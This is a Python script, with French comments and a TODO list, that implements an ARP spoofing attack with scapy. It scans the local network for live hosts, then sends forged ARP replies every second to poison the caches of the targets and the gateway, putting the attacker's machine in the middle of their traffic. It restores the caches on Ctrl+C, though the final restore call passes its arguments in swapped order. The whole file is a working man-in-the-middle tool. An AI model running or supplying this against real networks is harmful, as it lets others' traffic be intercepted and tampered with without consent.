from scapy.all import Ether, ARP, srp, send, conf, get_if_addr, getmacbyip
from tqdm import tqdm
from ipaddress import IPv4Address, IPv4Network
import ifcfg
import argparse
import time
import os
import sys

# TODO
# Bien comprendre les fonctions scapy
# Activer / désactiver ip forwarding (avec une option ligne de commande)
# Ajouter -v en paramètre
# Soigner un petit peu le README
# Trouver le hostname des cibles
# Mon scan ne semble pas trouver toutes les cibles
# Factoriser le code
# Réparer le restore pour que ça se fasse dans les deux sens

    
# Fonction qui liste toutes les IPs du réseau (sauf la nôtre et default gateway)
def get_all_ips():
    interface = conf.iface.name
    submask = ifcfg.interfaces()[interface]['netmask']
    my_ip = get_if_addr(conf.iface)
    default_gateway = get_default_gateway()
    network = IPv4Network(f'{my_ip}/{submask}', strict=False)
    net = IPv4Network(network)
    ip_list = []
    for ip in net:
        ip = str(ip)
        if ip != my_ip and ip != default_gateway:
            ip_list.append(ip)
    return ip_list
    
def get_default_gateway():
    return conf.route.route("0.0.0.0")[2]

# Fonction qui récupère tous les devices du réseau local à l'exclusion du default gateway et de notre propre IP
def get_targets(verbose=True):
    list_targets = []
    ip_list = get_all_ips()
    for ip in tqdm(ip_list, desc="Scan du réseau"):
        mac = getmacbyip(ip)
        if mac is not None:
            list_targets.append(ip)
        if mac is not None and verbose:
            print(f"[+] Mac {ip} : {mac}")
    return list_targets


# On envoie des réponses ARP de target_ip vers host_ip pour donner notre propre adresse MAC
def spoof(target_list, host_ip, verbose=True):
    # Récupérer l'adresse Mac de la cible
    for target_ip in target_list:

        # target_ip / host_ip
        target_mac = getmacbyip(target_ip)
        arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
        send(arp_response, verbose=0)
        if verbose:
            self_mac = ARP().hwsrc
            print(f"[+] Sent to {target_ip} : {host_ip} is-at {self_mac}")

        # host_ip / target_ip
        target_mac = getmacbyip(host_ip)
        arp_response = ARP(pdst=host_ip, hwdst=target_mac, psrc=target_ip, op='is-at')
        send(arp_response, verbose=0)
        if verbose:
            self_mac = ARP().hwsrc
            print(f"[+] Sent to {host_ip} : {target_ip} is-at {self_mac}")        

def restore(target_list, host_ip, verbose=True):
    for target_ip in target_list:
        target_mac = getmacbyip(target_ip)
        host_mac = getmacbyip(host_ip)
        arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op="is-at")
        send(arp_response, verbose=0, count=7)
        if verbose:
            print(f"[+] Sent to {target_ip} : {host_ip} is-at {host_mac}")

if __name__ == '__main__':

    parser = argparse.ArgumentParser()
    parser.add_argument("--host", type=str, help="Host qu'on souhaite simuler (par défaut : default gateway)", default="default")
    parser.add_argument("--target", "-t", type=str, help="Target (par défaut : toutes les IPs du réseau local)", default="all")

    args = parser.parse_args()

    if args.host == 'default':
        host = get_default_gateway()
    else:
        host = args.host

    target_list = []
    if args.target == 'all':
        target_list = get_targets()
    else:
        target_list.append(args.target)

    print(f"Host : {host}")
    print(f"Target : {target_list}")
    verbose = True
    try:
        while True:
            
            spoof(target_list, host, verbose)
            time.sleep(1)
    except KeyboardInterrupt:
        print('[!] Detected CTRL+C ! restoring the network, please wait...')
        restore(target_list, host)
        restore(host, target_list)